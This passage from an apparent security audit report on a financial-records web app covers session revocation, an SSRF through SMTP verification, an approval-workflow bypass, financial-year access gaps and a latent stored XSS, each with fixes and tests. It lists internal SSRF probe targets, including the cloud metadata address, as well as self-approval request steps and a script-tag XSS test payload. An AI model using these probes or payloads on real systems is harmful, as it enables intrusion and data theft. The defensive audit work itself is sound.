**(d) Auditors cannot be disabled at all.** `Auditor` has no `is_active` column
(`app/models/auditor.py`), `get_current_auditor` (`app/auth.py:100-121`) checks only
existence, and `account_admin.find_accounts` hardcodes the fact:

```python
# app/services/account_admin.py:70-71
"is_active": True,  # auditors have no active flag
"deleted_at": None,  # auditors are never soft-deleted
```

The only lever is revoking individual engagement grants. There is no way to
respond to "this auditor's laptop was stolen" other than changing their password
— which, per (b), does not evict the existing session either.

**(e) Refresh rotation creates many concurrent valid tokens.** Each refresh
issues a *new* refresh token without invalidating the old one, and
`http.ts:120-124` refreshes per-request on 401. A burst of concurrent 401s
produces several simultaneously-valid refresh tokens, all long-lived.

#### Impact

There is no mechanism by which an administrator, or a user, can terminate a
session. Every credential-compromise scenario has a 7-day floor on remediation.
For a product holding statutory financial records and encrypted document vaults,
this is the most structurally significant authentication gap in the system.

#### Proposed fix

Two options. **Option B is recommended** — it is a fraction of the work and
covers (a), (b), (c) and (d).

##### Option A — `jti` + Redis denylist (precise, more moving parts)

Add `jti` to both token types, and check a Redis denylist in the dependencies.
Rejected as the primary recommendation because it makes authentication depend on
Redis availability, and `rate_limit.py` already documents the reasoning for not
doing that.

##### Option B — monotonic `token_version` (recommended)

One integer column per principal, embedded in the token and compared on every
use. No new infrastructure, no per-request Redis call, and it is checked in the
same query that already loads the user.

**1. Migration:**

```python
def upgrade() -> None:
    op.add_column("company_users", sa.Column(
        "token_version", sa.Integer(), nullable=False, server_default="0"))
    op.add_column("auditors", sa.Column(
        "token_version", sa.Integer(), nullable=False, server_default="0"))
    op.add_column("auditors", sa.Column(
        "is_active", sa.Boolean(), nullable=False, server_default="true"))
```

**2. Mint with the version:**

```python
# app/auth.py
def _token(subject_id, principal_type, token_version, *, kind: str, lifetime: timedelta) -> str:
    return jwt.encode(
        {
            "sub": str(subject_id),
            "principal_type": principal_type,
            "tv": token_version,
            "type": kind,
            "iat": datetime.now(timezone.utc),
            "exp": datetime.now(timezone.utc) + lifetime,
        },
        settings.JWT_SECRET_KEY,
        algorithm=settings.JWT_ALGORITHM,
    )

def create_access_token(subject_id, principal_type, token_version: int = 0) -> str:
    return _token(subject_id, principal_type, token_version, kind="access",
                  lifetime=timedelta(minutes=settings.ACCESS_TOKEN_EXPIRE_MINUTES))

def create_refresh_token(subject_id, principal_type, token_version: int = 0) -> str:
    return _token(subject_id, principal_type, token_version, kind="refresh",
                  lifetime=timedelta(days=settings.REFRESH_TOKEN_EXPIRE_DAYS))
```

**3. Verify on every use:**

```python
# app/auth.py — get_current_company_user, after loading `user`
if payload.get("tv", 0) != user.token_version:
    raise HTTPException(401, detail="Session has been revoked")
if not user.is_active or user.deleted_at is not None:   # deleted_at added here
    raise HTTPException(401, detail="Account is inactive")
```

and the mirror in `get_current_auditor`, which also gains the `is_active` check
it currently lacks.

**4. Bump the version wherever a session should die:**

| Trigger | Location |
|---|---|
| Password change | `users.py` `change_password` |
| Operator password reset | `account_admin.set_password` |
| Deactivate user | `users.py` `deactivate_user` |
| Soft-delete user | `account_admin.soft_delete_company_user` |
| Explicit "sign out everywhere" | new endpoint |

```python
# in change_password, alongside the existing writes
current_user.hashed_password = hash_password(body.new_password)
current_user.password_changed_at = datetime.now(timezone.utc)
current_user.token_version += 1          # <- evicts every existing session
```

**5. Harden the refresh endpoints** to mirror login exactly:

```python
# app/routers/auth.py — company_refresh
user = (await db.execute(
    select(CompanyUser).where(
        CompanyUser.id == user_id,
        CompanyUser.deleted_at.is_(None),
    )
)).scalar_one_or_none()
if user is None or not user.is_active:
    raise HTTPException(401, detail="Invalid refresh token")
if payload.get("tv", 0) != user.token_version:
    raise HTTPException(401, detail="Session has been revoked")
company = (await db.execute(select(Company).where(Company.id == user.company_id))).scalar_one_or_none()
if company is None or company.archived_at is not None:
    raise HTTPException(401, detail="Invalid refresh token")
```

Note the deliberately uniform `"Invalid refresh token"` message — the current
code returns a distinguishable `"User not found"`, which is a minor enumeration
oracle.

**6. Add a logout endpoint** so the client can actually end a session:

```python
@router.post("/company/logout", status_code=status.HTTP_204_NO_CONTENT)
async def company_logout(
    user: Annotated[CompanyUser, Depends(get_current_company_user)],
    db: Annotated[AsyncSession, Depends(get_db)],
):
    """Invalidate every token issued to this user, on every device."""
    user.token_version += 1
    await db.commit()
    return None
```

and call it from the frontend before clearing `localStorage`.

**7. Shorten the refresh lifetime.** 7 days with no revocation is the worst
combination. Once revocation exists, 7 days is defensible; until then consider
`REFRESH_TOKEN_EXPIRE_DAYS=1`.

#### Migration safety

`server_default="0"` plus `payload.get("tv", 0)` means tokens issued before the
deploy keep working (their missing `tv` reads as 0, matching the default). No
forced logout at rollout. If you *want* to invalidate everything at deploy time,
set the server default to `1` instead.

#### Regression test

```python
async def test_password_change_revokes_existing_sessions(client, user_tokens):
    await change_password(client, user_tokens, ...)
    r = await client.get("/api/v1/users/me",
                         headers={"Authorization": f"Bearer {user_tokens.access}"})
    assert r.status_code == 401

async def test_refresh_rejects_deactivated_user(...): ...
async def test_refresh_rejects_soft_deleted_user(...): ...
async def test_logout_invalidates_refresh_token(...): ...
```

#### Effort

Medium — one migration, ~40 lines across `auth.py` and the two refresh handlers,
five bump sites, one new endpoint, plus a small frontend change.

---

<a name="kub-006"></a>
### KUB-006 — Tenant-configurable SSRF via SMTP verification

| | |
|---|---|
| **Severity** | High |
| **Status** | NEW |
| **Confidence** | CONFIRMED |
| **Class** | Server-Side Request Forgery (OWASP A10) |
| **Locations** | `app/routers/company_smtp.py:125-166`, `app/schemas/company_smtp.py:32-40`, `app/services/email/client.py:46-73,176-200`, `docker-compose.yml:110-114` |

#### What is wrong

`POST /api/v1/company/smtp/verify` accepts an arbitrary host and port from any
company **admin** and opens a TCP connection to it:

```python
# app/routers/company_smtp.py:131
if body.host and body.user and body.password:
    config = EmailConfig(
        host=body.host,
        port=body.port or 587,     # no range validation on this path
        ...
    )
...
res = await asyncio.to_thread(service.verify_connection)
```

```python
# app/schemas/company_smtp.py:32 — note the missing constraints
class CompanySmtpVerifyRequest(BaseModel):
    host: Optional[str] = None
    port: Optional[int] = None      # cf. CompanySmtpConfigUpdate: Field(ge=1, le=65535)
```

There is **no allowlist, no private-range block, no link-local block, and no DNS
re-resolution guard**.

#### Why this is response-based, not blind

Both success and failure return data about the target to the caller:

```python
# app/services/email/client.py:190-200 — success path
return {
    "status": "ok", "host": ..., "port": ...,
    "latency_ms": round(latency_ms, 2),
    "response": resp.decode("utf-8", errors="ignore") ...,
}
```
```python
# app/services/email/client.py:187-188 — failure path
except Exception as e:
    raise EmailDeliveryError(f"SMTP connection test failed: {e}")
```
```python
# app/routers/company_smtp.py:165-166 — surfaced verbatim to the HTTP caller
except EmailDeliveryError as e:
    raise HTTPException(status_code=400, detail=str(e))
```

`smtplib.SMTP(host, port)` reads the server greeting on connect. For a non-SMTP
service the resulting `SMTPConnectError` / `SMTPServerDisconnected` carries the
bytes the target sent, and those bytes are returned in the HTTP 400 body. The
attacker distinguishes, at minimum: connection refused vs. filtered (timeout) vs.
open-and-speaking, and frequently gets the service banner itself.

#### Why the internal reach is significant

`api` is the one container attached to **both** networks:

```yaml
# docker-compose.yml:110-114
    # `api` bridges both networks: it serves the gateway on `edge` and reaches
    # Postgres/Redis on `data`. caddy/gateway/frontend have no route to `data`.
    networks:
      - edge
      - data
```

So the network segmentation that keeps `postgres` and `redis` off the edge is
bypassed by this endpoint. Reachable from it:

| Target | What the response reveals |
|---|---|
| `postgres:5432` | port open; PostgreSQL rejects the SMTP handshake distinctively |
| `redis:6379` | port open; Redis answers `EHLO` with `-ERR unknown command`, echoed back |
| `api:8000`, `127.0.0.1:8000` | uvicorn's HTTP 400 response text |
| `gateway:80`, `frontend:80` | nginx 400 response |
| `169.254.169.254:80` | cloud instance-metadata reachability |
| arbitrary internal IPs | full port-scan primitive with timing |

Timeout is bounded to `EmailConfig.timeout = 15` (`schemas.py:47`), so it is not
also a thread-exhaustion DoS — but 15 seconds per probe in
`asyncio.to_thread` against a default 40-thread executor is still a cheap
resource-consumption lever given [KUB-003](#kub-003).

#### What it is *not*

Credential exfiltration of the *saved* SMTP password is **not** possible here.
The redirect branch requires the caller to supply `host` **and** `user` **and**
`password`; supplying only `host` falls through to
`get_email_config_for_company`, which uses the stored host. Verified at
`company_smtp.py:131`.

#### Proposed fix

Resolve the hostname and reject non-public addresses **before** connecting, and
return a generic error.

```python
# app/services/email/net_guard.py  (new)
"""Egress guard for tenant-supplied SMTP endpoints.

A company admin chooses their own mail server, so the host cannot be a fixed
allowlist — but it must never be an address inside our own network. Resolution
happens here and the resolved address is what gets connected to, so a DNS name
that resolves to a private address is rejected rather than followed.
"""
import ipaddress
import socket

ALLOWED_PORTS = frozenset({25, 465, 587, 2525})


class BlockedSmtpTarget(ValueError):
    """The requested SMTP endpoint is not a permitted egress destination."""


def resolve_public_smtp_target(host: str, port: int) -> list[str]:
    if port not in ALLOWED_PORTS:
        raise BlockedSmtpTarget(
            f"Port {port} is not a permitted SMTP port "
            f"({', '.join(str(p) for p in sorted(ALLOWED_PORTS))})."
        )
    try:
        infos = socket.getaddrinfo(host, port, proto=socket.IPPROTO_TCP)
    except socket.gaierror as exc:
        raise BlockedSmtpTarget(f"Could not resolve {host!r}.") from exc

    addresses = []
    for *_, sockaddr in infos:
        ip = ipaddress.ip_address(sockaddr[0])
        if (ip.is_private or ip.is_loopback or ip.is_link_local
                or ip.is_reserved or ip.is_multicast or ip.is_unspecified):
            raise BlockedSmtpTarget(
                f"{host} resolves to a non-public address and cannot be used as a mail server."
            )
        addresses.append(str(ip))
    if not addresses:
        raise BlockedSmtpTarget(f"Could not resolve {host!r}.")
    return addresses
```

Call it in `EmailService._get_connection`, so **every** path is covered — the
verify endpoint, the saved config, and the Celery worker:

```python
# app/services/email/client.py
    def _get_connection(self):
        if not self.config.host:
            raise EmailDeliveryError("SMTP_HOST is not configured.")

        # Tenant-supplied host/port: never let it point back into our own network.
        try:
            resolve_public_smtp_target(self.config.host, self.config.port)
        except BlockedSmtpTarget as exc:
            raise EmailDeliveryError(str(exc)) from exc
        ...
```

Constrain the schema to match `CompanySmtpConfigUpdate`:

```python
# app/schemas/company_smtp.py
class CompanySmtpVerifyRequest(BaseModel):
    host: Optional[str] = Field(None, min_length=1, max_length=255)
    port: Optional[int] = Field(None, ge=1, le=65535)
    ...
```

And stop echoing the target's response to the caller:

```python
# app/routers/company_smtp.py
    except EmailDeliveryError as e:
        logger.warning("SMTP verify failed for company %s: %s", user.company_id, e)
        raise HTTPException(
            status_code=400,
            detail="Could not connect to that mail server. Check the host, port and credentials.",
        )
```

Drop `"response"` from the `verify_connection` return dict — nothing consumes it
(`CompanySmtpVerifyResponse` does not include it).

#### Residual risk

`resolve_public_smtp_target` resolves, then `smtplib` resolves again — a TOCTOU
window for DNS rebinding. Closing it fully means connecting to the pinned IP with
`server_hostname` set for TLS. Given the attacker here is an authenticated tenant
admin and the payoff is a port scan rather than data theft, the resolve-and-check
approach is a reasonable stopping point; the rebinding gap should be noted in
`SECURITY_HARDENING.md` §10 rather than left implicit.

An alternative, stronger control: route worker/API egress through an explicit
proxy and drop direct outbound from the `api` container entirely. That is a
larger infrastructure change and is recorded here as the "do it properly" option.

#### Regression test

```python
@pytest.mark.parametrize("host", ["127.0.0.1", "localhost", "postgres", "redis",
                                  "169.254.169.254", "10.0.0.5", "[::1]"])
async def test_smtp_verify_refuses_internal_targets(admin_client, host):
    r = await admin_client.post("/api/v1/company/smtp/verify", json={
        "host": host, "port": 587, "user": "u", "password": "p"})
    assert r.status_code == 400
    assert "non-public" in r.json()["detail"] or "Could not connect" in r.json()["detail"]

async def test_smtp_verify_refuses_non_smtp_ports(admin_client):
    r = await admin_client.post("/api/v1/company/smtp/verify", json={
        "host": "smtp.example.com", "port": 6379, "user": "u", "password": "p"})
    assert r.status_code == 400
```

#### Effort

Small — one new ~40-line module, three call-site edits.

---

<a name="kub-007"></a>
### KUB-007 — DocVault approval workflow bypass and unrestricted document mass-assignment

| | |
|---|---|
| **Severity** | High |
| **Status** | NEW |
| **Confidence** | CONFIRMED |
| **Class** | Business-logic / broken access control (OWASP A01, A04) |
| **Locations** | `app/routers/docvault.py:649-744`, `app/schemas/docvault.py:76-83`, `app/models/docvault.py:11-18` |

#### What is wrong

`update_document` authorises on **bucket access only**, then mass-assigns every
field the schema permits:

```python
# app/routers/docvault.py:670-673 (the guard) and :733-734 (the assignment)
    # Approval permission guardrails: If document is pending approval, ONLY approver
    # or admin can modify ANY property or review
    is_approver_or_admin = (current_user.id == doc.approver_id or is_company_admin(current_user))
    if doc.status == DocumentStatus.pending_approval and not is_approver_or_admin:
        raise HTTPException(403, ...)
    ...
    for key, value in update_data.items():
        setattr(doc, key, value)
```

The guard is conditioned on `doc.status == pending_approval`. Every other state
is unguarded, and there is **no ownership check anywhere** — not `created_by`,
not `approver_id`.

The mass-assignment surface (`app/schemas/docvault.py:76`):

```python
class DocumentUpdate(BaseModel):
    title: Optional[str]
    status: Optional[DocumentStatus]     # <- the whole lifecycle
    bucket_id: Optional[uuid.UUID]
    tags: Optional[List[str]]
    is_editable: Optional[bool]          # <- the lock itself
    approver_id: Optional[uuid.UUID]     # <- who signs off
    approval_notes: Optional[str]
```

`DocumentStatus` (`app/models/docvault.py:11`) = `uploaded`, `pending_approval`,
`action_required`, `verified`, `submitted`, `overdue`, `archived`.

#### Exploit scenarios

All require only an authenticated company user with access to the document's
bucket — which, per [KUB-001](#kub-001), currently includes users with no
DocVault module grant at all.

1. **Self-approval.** Upload with `needs_approval=false` → status `uploaded` →
   `PATCH {"status": "verified"}`. The document now shows as verified without
   any approver having seen it. The elaborate approver-eligibility machinery
   (`list_docvault_approvers`, `user_has_docvault_access`, bucket-access checks
   on the approver at `docvault.py:426`) is bypassed entirely by not entering
   the workflow.

2. **Approver substitution.** For any document not currently
   `pending_approval`, set `approver_id` to a colleague — or reassign a document
   whose approval was already resolved.

3. **Unlocking a locked document.** `is_editable=false` is the immutability
   control (`delete_document` sets it, and `app/routers/docvault.py:684` enforces it for
   title/tags/bucket). But `is_editable` is itself in `update_data`, and the code
   explicitly computes `effective_editable = update_data.get("is_editable", doc.is_editable)`
   — so a single request `{"is_editable": true, "title": "x"}` unlocks and edits
   at once. The docstring calls this intentional; combined with no ownership
   check it means any user can unlock any document.

4. **Cross-bucket exfiltration by relocation.** Move a document from an
   `everyone` bucket into a `restricted` bucket the actor is granted (or the
   reverse — move a sensitive doc into `everyone`). `app/routers/docvault.py:687-693`
   validates the actor can access the *target* bucket, but nothing prevents
   moving a document *out* of a bucket the actor merely happens to see.

#### Impact

For a document platform whose selling point is controlled approval of compliance
artefacts, the approval state is not trustworthy. Nothing in the audit trail
distinguishes a properly approved document from a self-approved one — the
`document.updated` activity log records only `{"updated_fields": [...]}`.

#### Proposed fix

**1. Separate the status transition from the metadata edit.** Status is not a
field; it is a workflow transition with its own authorisation. Remove `status`
and `approval_notes` from `DocumentUpdate` and add explicit endpoints:

```python
# app/schemas/docvault.py
class DocumentUpdate(BaseModel):
    """Metadata only. Lifecycle transitions go through the review endpoints."""
    title: Optional[str] = Field(None, max_length=255)
    bucket_id: Optional[uuid.UUID] = None
    tags: Optional[List[str]] = None
    is_editable: Optional[bool] = None
    approver_id: Optional[uuid.UUID] = None


class DocumentReviewRequest(BaseModel):
    decision: Literal["verified", "action_required"]
    approval_notes: Optional[str] = Field(None, max_length=1000)
```

```python
# app/routers/docvault.py
@router.post("/documents/{document_id}/review", response_model=DocumentResponse)
async def review_document(
    document_id: uuid.UUID,
    body: DocumentReviewRequest,
    current_user: Annotated[CompanyUser, Depends(get_current_company_user)],
    db: Annotated[AsyncSession, Depends(get_db)],
):
    """Record an approval decision. Only the assigned approver or an admin, and
    only on a document that is actually awaiting review — a document can never
    reach `verified` without passing through `pending_approval`."""
    doc = await _load_accessible_document(db, document_id, current_user)
    if doc.status != DocumentStatus.pending_approval:
        raise HTTPException(409, detail="This document is not awaiting approval")
    if current_user.id != doc.approver_id and not is_company_admin(current_user):
        raise HTTPException(403, detail="Only the assigned approver or an admin can review this document")
    if current_user.id == doc.created_by and not is_company_admin(current_user):
        raise HTTPException(403, detail="You cannot approve your own document")
    ...
```

Note the added self-approval check — currently an admin who uploads a document
can also be its approver, and nothing stops a user from setting
`approver_id = self` before requesting approval.

**2. Add an ownership/authority check to metadata edits:**

```python
def _may_edit_document(user: CompanyUser, doc: Document) -> bool:
    """Who may change a document's metadata: its creator, its assigned approver,
    or a company admin. Bucket access alone is read access, not write access."""
    return (
        is_company_admin(user)
        or doc.created_by == user.id
        or doc.approver_id == user.id
    )
```
```python
    if not _may_edit_document(current_user, doc):
        raise HTTPException(403, detail="You cannot modify this document")
```

**3. Restrict `is_editable` re-enablement to the creator or an admin**, since it
is the immutability control:

```python
    if update_data.get("is_editable") is True and not (
        is_company_admin(current_user) or doc.created_by == current_user.id
    ):
        raise HTTPException(403, detail="Only the uploader or an admin can unlock a document")
```

**4. Log the transition specifically**, so the audit trail distinguishes a review
from a metadata edit:

```python
    await log_activity(db, ..., "document.reviewed", "document", doc.id,
                       {"from": prior.value, "to": body.decision, "notes": body.approval_notes})
```

**5. Backfill consideration.** Existing documents that reached `verified` without
review are indistinguishable from properly reviewed ones. If that matters for
your compliance posture, add an `approved_by` column (currently only
`approved_at` and `approver_id` exist) and treat `approved_by IS NULL AND status
= 'verified'` as unverified provenance.

#### Regression test

```python
async def test_employee_cannot_self_verify(employee_client, uploaded_doc):
    r = await employee_client.patch(f"/api/v1/docvault/documents/{uploaded_doc.id}",
                                    json={"status": "verified"})
    assert r.status_code == 422          # `status` no longer accepted here

async def test_review_requires_pending_state(...): ...
async def test_review_rejects_non_approver(...): ...
async def test_uploader_cannot_approve_own_document(...): ...
async def test_unrelated_user_cannot_edit_document_metadata(...): ...
```

#### Effort

Medium — an API shape change, so the frontend `DocVault` pages that currently
PATCH `status` need updating alongside it.

---

<a name="kub-008"></a>
### KUB-008 — Financial-year and depreciation controls inconsistently gated

| | |
|---|---|
| **Severity** | High |
| **Status** | NEW |
| **Confidence** | CONFIRMED |
| **Class** | Broken access control / integrity of statutory records |
| **Locations** | `app/routers/financial_years.py:73-106`, `app/routers/depreciation.py:106,295,333,370` |

#### What is wrong

Within one feature area, the authorization is inverted relative to sensitivity:

| Endpoint | Guard | Audit log | Reason required |
|---|---|---|---|
| `POST /depreciation/runs/{id}/reopen` | **`require_admin`** | yes | **yes** (`body.reason`) |
| `POST /depreciation/runs/{id}/finalize` | any employee | no | no |
| `POST /depreciation/runs` (create) | any employee | no | no |
| `DELETE /depreciation/runs/{id}` | any employee | no | no |
| `POST /financial-years/{id}/close` | any employee | **no** | no |
| `POST /financial-years/{id}/reopen` | any employee | **no** | no |
| `POST /financial-years` (create) | any employee | no | no |

Reopening a depreciation run is treated as a privileged, reason-bearing,
audit-logged action:

```python
# app/routers/depreciation.py:333-352
async def reopen_run(
    run_id: uuid.UUID,
    body: DepreciationRunReopenRequest,
    current_user: Annotated[CompanyUser, Depends(require_admin)],   # <- admin
    ...
    await log_activity(db, ..., "depreciation.run.reopened", ...,
                       {"reason": body.reason.strip()})
```

Reopening the entire **financial year** is not:

```python
# app/routers/financial_years.py:91-106
async def reopen_financial_year(
    fy_id: uuid.UUID,
    current_user: Annotated[CompanyUser, Depends(get_current_company_user)],  # <- anyone
    db: Annotated[AsyncSession, Depends(get_db)],
):
    fy = await db.get(FinancialYear, fy_id)
    if not fy or fy.company_id != current_user.company_id:
        raise HTTPException(404, ...)
    fy.status = FinancialYearStatus.open.value
    fy.closed_at = None          # <- provenance destroyed
    fy.closed_by = None          # <- provenance destroyed
    await db.commit()
```

`closed_at` and `closed_by` are set to `NULL` with no record that a close ever
happened. There is no activity log on either endpoint, so a close/reopen cycle
leaves **no trace at all**.

Tenant scoping is correct on all of these (`fy.company_id != current_user.company_id`
→ 404), so this is intra-tenant privilege, not cross-tenant.

`DELETE /depreciation/runs/{id}` does correctly refuse finalized runs
(`app/routers/depreciation.py:380-381`), so the destructive case is contained — but a
non-finalized run representing hours of work can be deleted by any employee.

#### Impact

Any employee — including one with zero module grants, per
[KUB-001](#kub-001)/[KUB-019](#kub-019) — can reopen a closed statutory financial
year, alter the underlying data, and re-close it, with no audit trail. For a
product whose purpose is statutory compliance this undermines the integrity of
the records it exists to keep.

#### Proposed fix

**1. Gate the period controls on admin** and give them the same treatment as
`reopen_run`:

```python
# app/schemas/financial_years.py
class FinancialYearReopenRequest(BaseModel):
    reason: str = Field(min_length=10, max_length=500)
```

```python
# app/routers/financial_years.py
@router.post("/{fy_id}/close", response_model=FinancialYearResponse)
async def close_financial_year(
    fy_id: uuid.UUID,
    current_user: Annotated[CompanyUser, Depends(require_admin)],
    db: Annotated[AsyncSession, Depends(get_db)],
):
    fy = await _owned_fy(db, fy_id, current_user.company_id)
    if fy.status == FinancialYearStatus.closed.value:
        raise HTTPException(409, detail="Financial year is already closed")
    fy.status = FinancialYearStatus.closed.value
    fy.closed_at = datetime.now(timezone.utc)
    fy.closed_by = current_user.id
    await log_activity(db, current_user.company_id, current_user.id,
                       "financial_year.closed", "financial_year", fy.id,
                       {"label": fy.label})
    await db.commit()
    await db.refresh(fy)
    return fy


@router.post("/{fy_id}/reopen", response_model=FinancialYearResponse)
async def reopen_financial_year(
    fy_id: uuid.UUID,
    body: FinancialYearReopenRequest,
    current_user: Annotated[CompanyUser, Depends(require_admin)],
    db: Annotated[AsyncSession, Depends(get_db)],
):
    fy = await _owned_fy(db, fy_id, current_user.company_id)
    if fy.status != FinancialYearStatus.closed.value:
        raise HTTPException(409, detail="Financial year is not closed")
    # Record what is being undone BEFORE clearing it — a reopen must not erase
    # the fact that a close happened.
    await log_activity(db, current_user.company_id, current_user.id,
                       "financial_year.reopened", "financial_year", fy.id,
                       {"reason": body.reason.strip(),
                        "was_closed_at": fy.closed_at.isoformat() if fy.closed_at else None,
                        "was_closed_by": str(fy.closed_by) if fy.closed_by else None})
    fy.status = FinancialYearStatus.open.value
    fy.closed_at = None
    fy.closed_by = None
    await db.commit()
    await db.refresh(fy)
    return fy
```

**2. Gate `finalize` on admin** to match `reopen`, and log it:

```python
# app/routers/depreciation.py:298 — change the dependency on finalize_run
    current_user: Annotated[CompanyUser, Depends(require_admin)],
```

**3. Consider blocking depreciation writes into a closed year.** Currently
`create_run` / `finalize` do not consult `FinancialYear.status`. Closing a year
should make it immutable; otherwise "closed" carries no meaning:

```python
    if run.financial_year.status == FinancialYearStatus.closed.value:
        raise HTTPException(409, detail="This financial year is closed. Reopen it first.")
```

#### Regression test

```python
async def test_employee_cannot_close_financial_year(employee_client, fy):
    r = await employee_client.post(f"/api/v1/financial-years/{fy.id}/close")
    assert r.status_code == 403

async def test_reopen_records_what_it_undid(admin_client, closed_fy, db):
    await admin_client.post(f"/api/v1/financial-years/{closed_fy.id}/reopen",
                            json={"reason": "restating Q3 depreciation"})
    log = await latest_activity(db, "financial_year.reopened")
    assert log.metadata_["was_closed_by"] is not None
    assert log.metadata_["reason"] == "restating Q3 depreciation"
```

#### Effort

Small — two routers, one new schema, three log calls.

---

<a name="kub-009"></a>
### KUB-009 — `inline` disposition with client-supplied Content-Type (latent stored XSS)

| | |
|---|---|
| **Severity** | Medium |
| **Status** | NEW (adjacent to `SECURITY_HARDENING.md` §10.7, which does not cover the `inline` case) |
| **Confidence** | **LATENT** — see "Why this is not currently exploitable" |
| **Class** | Stored XSS (OWASP A03) |
| **Locations** | `app/routers/asset_documents.py:349-359`, `app/routers/docvault.py:352-380`, `frontend/src/pages/company/assets/AssetPhoto.tsx:28,78`, `Caddyfile:16` |

#### What is wrong

The asset-document stream endpoint serves attacker-controlled bytes with an
attacker-controlled `Content-Type` and, for photo roles, `Content-Disposition:
inline`:

```python
# app/routers/asset_documents.py:351-359
    disposition = "inline" if link.doc_role in PHOTO_DOC_ROLES else "attachment"
    return Response(
        content=plaintext,
        media_type=version.mime_type or "application/octet-stream",
        headers={
            "Content-Disposition": f'{disposition}; filename="{version.original_filename}"',
            "Cache-Control": "private, max-age=300",
        },
    )
```

`version.mime_type` comes straight from the uploaded multipart part's
`Content-Type` header, with no validation:

```python
# app/routers/docvault.py:373
        mime_type=file.content_type or "application/octet-stream",
```

`_upload_and_attach` (`asset_documents.py:132-180`) performs **no magic-byte
check and no MIME allowlist**, and `doc_role` is a free `Form()` field chosen by
the uploader, so selecting a photo role is trivial.

`X-Content-Type-Options: nosniff` is set globally at the edge
(`Caddyfile:16`) but does not help: nosniff prevents the browser from *sniffing a
different type*, not from honouring a declared `text/html`. There is no CSP
anywhere (`SECURITY_HARDENING.md` §10.6).

#### Why this is not currently exploitable

Two independent conditions block it today, and both are incidental rather than designed:

1. **The endpoint requires an `Authorization: Bearer` header.** A browser cannot
   attach that during a top-level navigation, so a victim cannot be lured to the
   URL with their credentials. (This is a side effect of the localStorage token
   design — see §6.1.)
2. **The only consumer renders through `<img>` and filters on MIME:**
   ```tsx
   // frontend/src/pages/company/assets/AssetPhoto.tsx:28,78
   const isImage = (mimeType ?? '').startsWith('image/')
   ...
   <img src={url} alt={alt} className="h-full w-full object-cover" />
   ```
   HTML in an `<img>` does not execute.

The issue becomes live if **any** of these happens: someone opens the blob in a
new tab or an `<iframe>` (a `blob:` URL inherits the creating origin, so script
inside it is same-origin with the SPA); a "view raw / open in new tab" affordance
is added; the endpoint gains query-parameter or cookie authentication; or a
different component renders the stream without the `image/` filter.

#### Impact if it becomes reachable

Script executing on the app origin can read:

- `localStorage['kubera.company.tokens']` — access **and** 7-day refresh token,
  which cannot be revoked ([KUB-005](#kub-005));
- `localStorage['kubera.auditor.tokens']`;
- `sessionStorage['kubera_owner_key']` — the `INTERNAL_API_KEY`, if the victim is
  the operator ([KUB-012](#kub-012)), which grants create/delete of any company.

#### Proposed fix

The correct pattern already exists in this codebase **twice** and simply was not
applied here:

```python
# app/routers/users.py:71-76 — avatar streaming (correct)
    headers = {
        "Content-Security-Policy": "default-src 'none'; sandbox",
        "X-Content-Type-Options": "nosniff",
        "Cache-Control": "private, max-age=3600",
    }
    return Response(content=data, media_type=mime, headers=headers)
```
```python
# app/routers/company.py:195-199 — logo streaming (correct)
    headers = {
        "Content-Security-Policy": "default-src 'none'; style-src 'unsafe-inline'; sandbox",
        "X-Content-Type-Options": "nosniff",
        "Cache-Control": "private, max-age=60",
    }
```

**1. Add a shared helper** so every vault-streaming endpoint is consistent:

```python
# app/services/file_delivery.py  (new)
"""Uniform response construction for decrypted vault files.

Every one of these responses carries bytes an authenticated tenant user uploaded,
under a MIME type that same user chose. Two endpoints (avatar, logo) already got
this right; this centralises it so the next one cannot get it wrong.
"""
from urllib.parse import quote
from fastapi import Response

# Types we are willing to render in the browser. Anything else is downloaded.
INLINE_SAFE_MIME = frozenset({"image/jpeg", "image/png", "image/webp", "image/gif", "application/pdf"})

# Neutralises scripts, plugins, forms and framing even if the type is wrong.
SANDBOX_CSP = "default-src 'none'; img-src 'self' data:; style-src 'unsafe-inline'; sandbox"


def _content_disposition(disposition: str, filename: str) -> str:
    """RFC 6266. `filename` is uploader-controlled, so the quoted form is stripped
    to a safe ASCII subset and the real name goes in the RFC 5987 `filename*`."""
    ascii_fallback = "".join(c for c in filename if 32 <= ord(c) < 127 and c not in '"\\') or "download"
    return f"{disposition}; filename=\"{ascii_fallback}\"; filename*=UTF-8''{quote(filename, safe='')}"


def vault_file_response(
    *, content: bytes, mime_type: str | None, filename: str, allow_inline: bool = False,
) -> Response:
    mime = (mime_type or "application/octet-stream").split(";")[0].strip().lower()
    inline = allow_inline and mime in INLINE_SAFE_MIME
    if not inline:
        # Never echo an unvetted type on a download; the browser has no reason to
        # interpret it and every reason not to.
        mime = "application/octet-stream"
    return Response(
        content=content,
        media_type=mime,
        headers={
            "Content-Disposition": _content_disposition("inline" if inline else "attachment", filename),
            "Content-Security-Policy": SANDBOX_CSP,
            "X-Content-Type-Options": "nosniff",
            "Cache-Control": "private, no-store",
        },
    )
```

**2. Use it at all four streaming sites** — this also resolves
[KUB-010](#kub-010):

| File | Line | Current |
|---|---|---|
| `app/routers/asset_documents.py` | 352 | `inline`/`attachment`, raw mime, raw filename |
| `app/routers/docvault.py` | 641 | `attachment`, raw mime, raw filename |
| `app/routers/auditor_engagements.py` | 716 | `attachment`, raw mime, raw filename |
| `app/routers/users.py` / `company.py` | — | already correct; migrate for consistency |

```python
# app/routers/asset_documents.py — after
    return vault_file_response(
        content=plaintext,
        mime_type=version.mime_type,
        filename=version.original_filename,
        allow_inline=link.doc_role in PHOTO_DOC_ROLES,
    )
```

**3. Validate on upload too**, so bad data never lands. `detect_image_format`
already exists (`user_security.py:36`) and is used for avatars; apply it to
photo-role asset documents:

```python
# app/routers/asset_documents.py::_upload_and_attach
    if doc_role in PHOTO_DOC_ROLES:
        head = await file.read(32)
        await file.seek(0)
        if detect_image_format(head + b"\0" * 12) is None:
            raise HTTPException(415, detail="Photograph attachments must be JPG, PNG or WEBP")
```

**4. Ship a CSP** (`SECURITY_HARDENING.md` §10.6) — see [KUB-L17](#kub-l17) for a
concrete starting policy.

#### Regression test

```python
async def test_uploaded_html_is_never_served_inline(client, asset):
    r = await client.post(f"/api/v1/assets/{asset.id}/documents/upload",
        files={"file": ("x.html", b"<script>alert(1)</script>", "text/html")},
        data={"doc_role": "photo"})
    link_id = r.json()["id"]
    d = await client.get(f"/api/v1/asset-documents/{link_id}/thumbnail")
    assert d.headers["content-type"].startswith("application/octet-stream")
    assert d.headers["content-disposition"].startswith("attachment")
    assert "sandbox" in d.headers["content-security-policy"]
```

#### Effort

Small — one new module, four call sites. Bundle with KUB-010.

---

<a name="kub-010"></a>
### KUB-010 — `Content-Disposition` filename injection

| | |
